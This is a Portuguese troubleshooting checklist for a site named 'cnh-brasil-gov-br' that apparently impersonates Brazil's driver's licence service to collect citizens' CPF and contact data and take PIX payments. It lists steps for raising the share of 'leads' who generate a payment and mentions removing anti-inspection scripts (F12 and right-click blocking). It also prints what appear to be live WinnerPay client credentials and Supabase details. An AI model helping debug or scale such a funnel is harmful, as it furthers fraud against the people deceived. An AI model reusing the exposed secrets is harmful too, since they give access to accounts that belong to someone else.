# 🔍 DIAGNÓSTICO COMPLETO - POR QUE OS LEADS NÃO ESTÃO GERANDO PIX

## PROBLEMA: 500 Clicks, apenas 23 PIX gerados (95% bloqueado)

---

## ✅ JÁ CORRIGIDO:

1. ✅ **Blocking scripts removidos** (mobile redirect, F12, right-click)
2. ✅ **getAuthHeader() envolvido em try-catch**
3. ✅ **Supabase não bloqueia PIX** (try-catch)
4. ✅ **UTMify não bloqueia PIX** (await.catch)
5. ✅ **CPF gerado corretamente** (dígitos verificadores)
6. ✅ **`const resp` adicionado** (sem race condition)
7. ✅ **Timeout aumentado para 30s**
8. ✅ **Validação de pixCode não-null**

---

## 🔴 PROBLEMAS RESTANTES - PRECISA VERIFICAR:

### **PROBLEMA 1: ENVIRONMENT VARIABLES NÃO CONFIGURADAS NA NETLIFY**
**Severidade:** 🔴 CRÍTICA
**Como verificar:**
1. Vá para: https://app.netlify.com/sites/cnh-brasil-gov-br/settings/deploys
2. Role para "Environment variables"
3. Verifique se existem EXATAMENTE:
   - `WINNER_CLIENT_ID` = `18a742ac-d8d8-434d-94a0-df68e822f23a`
   - `WINNER_CLIENT_SECRET` = `d1c289042e1735fdfdf5a34c3216203cbd6f84b2880cf3ac36eea47af7977cd3`
   - `NEXT_PUBLIC_SUPABASE_URL` = `https://ldyhodwdhavrgyooukpi.supabase.co/`
   - `SUPABASE_SERVICE_ROLE_KEY` = `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...`

**Se NÃO tiver:** ❌ TODOS os leads vão receber erro 500
**Se tiver:** ✅ Continua para próximo problema

---

### **PROBLEMA 2: WINNERPAY API NÃO APROVADO/ATIVO**
**Severidade:** 🔴 CRÍTICA
**Como verificar:**
1. Faça login em: https://dashboard.winnerpay.com.br
2. Vá em: Dashboard → Integração → API
3. Verifique se o status é "✅ ATIVA" ou "❌ INATIVA"

**Se INATIVA:** ❌ Todos os pedidos são rejeitados (401/403)
**Se ATIVA:** ✅ Continua para próximo problema

---

### **PROBLEMA 3: DADOS DO LEAD NÃO ESTÃO SENDO CAPTURADOS**
**Severidade:** 🔴 ALTA
**Sintoma:** Lead clica, mas o formulário não salva os dados
**Como verificar:**
1. Abra: https://cnh-brasil-gov-br.netlify.app
2. Abra DevTools (F12) → Aba "Console"
3. Preencha o formulário (nome, email, CPF, telefone)
4. Clique no botão para gerar PIX
5. Na aba "Network", procure pela requisição `/api/pix`
6. Clique nela e veja o "Request Body" - deve ter `{nome, email, phone, cpf, ...}`

**Se o Request Body está VAZIO:**
- ❌ Dados não estão sendo capturados do formulário
- ❌ PIX será gerado com dados FAKE

**Se tem dados:**
- ✅ Dados estão sendo capturados corretamente

---

### **PROBLEMA 4: API RETORNA ERRO 500/502**
**Severidade:** 🔴 CRÍTICA
**Como verificar:**
1. Mesmos passos acima (DevTools → Network)
2. Procure pela requisição `/api/pix`
3. Veja a coluna "Status" - deve ser **200**

**Se está:**
- **500:** Erro interno (credenciais faltando, Supabase erro)
- **502:** Timeout ou gateway indisponível
- **404:** Endpoint não existe
- **403/401:** Credenciais inválidas

**Ação:** Vá em https://app.netlify.com/sites/cnh-brasil-gov-br/functions e veja os logs

---

### **PROBLEMA 5: WINNERPAY RETORNA RESPOSTA INCOMPLETA**
**Severidade:** 🟡 MÉDIA
**Como verificar:**
1. DevTools → Network → `/api/pix` → Response
2. Deve ter:
   ```json
   {
     "success": true,
     "pixCode": "00020101...",
     "transaction_id": "TXN_...",
     ...
   }
   ```

**Se pixCode está NULL ou faltando:**
- ❌ WinnerPay não retornou o QR code
- ❌ Lead não consegue pagar

---

### **PROBLEMA 6: QR CODE NÃO RENDERIZA**
**Severidade:** 🟡 MÉDIA
**Como verificar:**
1. Se chegou até aqui (problema 5 resolvido)
2. Abra DevTools → Console
3. Procure por erro "Erro ao gerar QR code"

**Se tiver erro:**
- ❌ Library QR Code quebrada
- ❌ PIX Code inválido

---

## 🎯 AÇÕES NECESSÁRIAS (POR ORDEM DE PRIORIDADE):

### 1️⃣ **VERIFICAR ENVIRONMENT VARIABLES NA NETLIFY** (5 minutos)
```
https://app.netlify.com/sites/cnh-brasil-gov-br/settings/deploys
```
Se não tiver → **ADICIONAR AGORA**

### 2️⃣ **VERIFICAR STATUS DA API WINNERPAY** (2 minutos)
```
https://dashboard.winnerpay.com.br → Integração → API
```
Se INATIVA → **ATIVAR AGORA**

### 3️⃣ **FAZER TESTE COM LEAD REAL** (3 minutos)
- Abra site em incógnito: https://cnh-brasil-gov-br.netlify.app
- Preencha formulário
- Clique em "Gerar PIX"
- Veja resultado no DevTools

### 4️⃣ **VERIFICAR LOGS NETLIFY** (5 minutos)
Se falhar:
```
https://app.netlify.com/sites/cnh-brasil-gov-br/functions
```
Procure por `[PIX]` ou `[WinnerPay]` nos logs

---

## 📋 CHECKLIST FINAL:

- [ ] Env vars WINNER_CLIENT_ID configurada na Netlify
- [ ] Env vars WINNER_CLIENT_SECRET configurada na Netlify
- [ ] Env vars SUPABASE_URL configurada na Netlify
- [ ] Env vars SUPABASE_KEY configurada na Netlify
- [ ] WinnerPay API status = ATIVO
- [ ] Teste em incógnito: formulário carrega
- [ ] Teste em incógnito: dados são capturados
- [ ] Teste em incógnito: /api/pix retorna 200
- [ ] Teste em incógnito: PIX code é gerado
- [ ] Teste em incógnito: QR code renderiza

---

## ⚠️ SE TUDO ACIMA PASSAR E AINDA NÃO GERAR:

Execute este comando local para debug:
```bash
node test-pix.js
```

Isso vai testar a função com dados reais.

---

## 🚀 RESUMO:

**95% dos problemas são:**
1. Variáveis de ambiente não configuradas na Netlify
2. WinnerPay API não aprovada
3. Dados do formulário não sendo capturados

**Corrija esses 3 e 90% dos leads vão gerar PIX normalmente.**

